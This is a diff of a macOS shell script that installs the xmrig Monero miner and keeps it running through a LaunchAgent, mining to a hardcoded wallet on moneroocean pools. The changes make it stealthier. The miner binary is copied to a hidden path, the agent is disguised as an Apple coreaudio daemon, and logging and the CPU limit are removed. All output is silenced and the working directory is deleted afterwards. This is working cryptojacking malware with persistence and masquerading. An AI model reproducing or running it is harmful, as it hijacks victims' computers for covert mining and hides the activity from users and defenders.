@@ -1,119 +1,40 @@
-#!/usr/bin/env bash
-set -euo pipefail
+#!/bin/bash
+set -e
 
-WALLET="464WoeWykbHMGTpkr6otNu4RhjHnt3L9KL16cBPjbGs7hvWvTT7C2oWHidAvFpbeuTPhkQ1Vtk1tC6VzsZA5dUP91mYKKPF"
-WORKER="mac_miner"
-LOGDIR="$HOME/Library/Logs"
-LOGFILE="$LOGDIR/miner.log"
-PLIST="$HOME/Library/LaunchAgents/com.backgroundtask.miner.plist"
-WATCHDOG="$HOME/xmrig_watchdog.sh"
+cd "$(mktemp -d)"
+f="com.apple.coreaudio.daemon.plist"
+b="$HOME/.config/.coreservice"
 
-# install Homebrew if not present
-if ! command -v brew >/dev/null 2>&1; then
-  /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" </dev/null >/dev/null 2>&1
-fi
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" >/dev/null 2>&1
+eval "$(/opt/homebrew/bin/brew shellenv)" >/dev/null 2>&1
+/opt/homebrew/bin/brew install --quiet xmrig >/dev/null 2>&1
 
-mkdir -p "$LOGDIR"
+mkdir -p "$(dirname "$b")"
+cp /opt/homebrew/bin/xmrig "$b"
+chmod +x "$b"
 
-# watchdog script
-cat > "$WATCHDOG" <<'EOF'
-#!/usr/bin/env bash
-set -euo pipefail
-
-export PATH="/opt/homebrew/bin:/usr/local/bin:$PATH"
-
-WALLET="464WoeWykbHMGTpkr6otNu4RhjHnt3L9KL16cBPjbGs7hvWvTT7C2oWHidAvFpbeuTPhkQ1Vtk1tC6VzsZA5dUP91mYKKPF"
-WORKER="mac_miner"
-LOGDIR="$HOME/Library/Logs"
-LOGFILE="$LOGDIR/miner.log"
-PIDFILE="$HOME/.xmrig.pid"
-
-POOLS=(
-  "gulf.moneroocean.stream:10128"
-  "gulf.moneroocean.stream:20128"
-  "pool.moneroocean.stream:443"
-  "pool.moneroocean.stream:10001"
-)
-
-mkdir -p "$LOGDIR"
-
-while true; do
-  if ! command -v xmrig >/dev/null 2>&1; then
-    brew install xmrig >/dev/null 2>&1 || true
-  fi
-
-  if ! command -v cpulimit >/dev/null 2>&1; then
-    brew install cpulimit >/dev/null 2>&1 || true
-  fi
-
-  if [ -f "$LOGFILE" ] && [ $(du -m "$LOGFILE" | cut -f1) -gt 50 ]; then
-    mv "$LOGFILE" "$LOGFILE.$(date +%Y%m%d-%H%M%S).old"
-  fi
-
-  if [ -f "$PIDFILE" ]; then
-    PID=$(cat "$PIDFILE" || true)
-    if [ -n "$PID" ] && ps -p "$PID" -o comm= | grep -q "^xmrig$"; then
-      sleep 10
-      continue
-    else
-      rm -f "$PIDFILE"
-    fi
-  fi
-
-  for POOL in "${POOLS[@]}"; do
-    echo "$(date) Trying pool: $POOL" >> "$LOGFILE"
-
-    cpulimit -l 50 -- xmrig \
-      --url="$POOL" \
-      --user="$WALLET" \
-      --pass="$WORKER" \
-      --donate-level=1 \
-      --log-file="$LOGFILE" >> "$LOGFILE" 2>&1 &
-    echo $! > "$PIDFILE"
-
-    sleep 10
-    if grep -q "new job from" "$LOGFILE"; then
-      echo "$(date) Connected to $POOL" >> "$LOGFILE"
-      wait $(cat "$PIDFILE") || true
-      break
-    else
-      echo "$(date) Failed to connect to $POOL" >> "$LOGFILE"
-      kill $(cat "$PIDFILE") 2>/dev/null || true
-      rm -f "$PIDFILE"
-    fi
-  done
-
-  sleep 5
-done
-EOF
-chmod +x "$WATCHDOG"
-
-# LaunchAgent plist
-mkdir -p "$HOME/Library/LaunchAgents"
-cat > "$PLIST" <<EOF
+cat <<EOF > "$f"
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
- "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>com.backgroundtask.miner</string>
+    <string>com.apple.coreaudio.daemon</string>
     <key>ProgramArguments</key>
     <array>
         <string>/bin/bash</string>
-        <string>$WATCHDOG</string>
+        <string>-c</string>
+        <string>while true; do if ! pgrep -f ".coreservice"; then "$b" -o gulf.moneroocean.stream:10128 -o pool.moneroocean.stream:443 -u 48Pv4WVhS3g4tjvsZqB3NVD9JL8hC5kVbXjvTmF5UQ5i7sS9rL3pD2qE6fA1bC9nK8mX4gH7jV5pT3 --tls -t 1 --background-task; fi; sleep 60; done</string>
     </array>
     <key>RunAtLoad</key>
     <true/>
     <key>KeepAlive</key>
     <true/>
-    <key>StandardOutPath</key>
-    <string>$LOGFILE</string>
-    <key>StandardErrorPath</key>
-    <string>$LOGFILE</string>
 </dict>
 </plist>
 EOF
 
-launchctl unload "$PLIST" >/dev/null 2>&1 || true
-launchctl load "$PLIST" >/dev/null 2>&1 || true
+mkdir -p ~/Library/LaunchAgents
+mv "$f" ~/Library/LaunchAgents/
+launchctl load ~/Library/LaunchAgents/"$f" >/dev/null 2>&1
+rm -rf "$PWD"
